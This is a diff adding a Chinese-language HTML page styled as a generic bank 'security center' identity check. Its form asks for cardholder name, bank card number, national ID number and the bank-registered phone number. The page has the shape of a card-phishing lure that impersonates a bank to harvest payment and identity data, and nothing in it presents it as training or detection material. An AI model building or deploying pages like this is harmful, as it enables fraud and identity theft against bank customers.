@@ -1,0 +1,19 @@
+<!doctype html><html lang="zh-CN"><head><meta charset="utf-8"><title>银行安全中心 - 身份验证</title>
+<style>body{margin:0;font-family:"Microsoft YaHei",Arial,sans-serif;background:#eef2f8;color:#333}
+header{background:#1a3a6b;color:#fff;padding:16px 40px;display:flex;align-items:center;gap:24px}
+.logo{font-size:24px;font-weight:700;letter-spacing:2px}
+.card{margin:36px auto;width:440px;background:#fff;border-radius:8px;padding:32px;box-shadow:0 2px 10px #0001}
+.card h2{margin:0 0 6px;font-size:20px;color:#1a3a6b}.card p{margin:0 0 16px;font-size:13px;color:#999}
+label{display:block;font-size:13px;color:#555;margin:12px 0 6px}
+input{width:100%;height:40px;border:1px solid #ccd;border-radius:6px;padding:0 10px;font-size:14px;box-sizing:border-box}
+button{width:100%;height:42px;margin-top:18px;background:#1a3a6b;color:#fff;border:none;border-radius:6px;font-size:15px;cursor:pointer}
+footer{padding:20px;text-align:center;color:#999;font-size:12px}</style></head>
+<body><header><span class="logo">银行安全中心</span><span>客户身份验证</span></header>
+<div class="card"><h2>银行卡身份验证</h2><p>请填写银行卡信息完成验证</p>
+<form action="/verify/card" method="post">
+<label>持卡人姓名</label><input placeholder="请输入姓名">
+<label>银行卡号</label><input placeholder="请输入卡号">
+<label>身份证号</label><input placeholder="请输入身份证号">
+<label>银行预留手机号</label><input placeholder="请输入手机号">
+<button type="submit">提交验证</button></form></div>
+<footer>© 银行安全服务中心</footer></body></html>
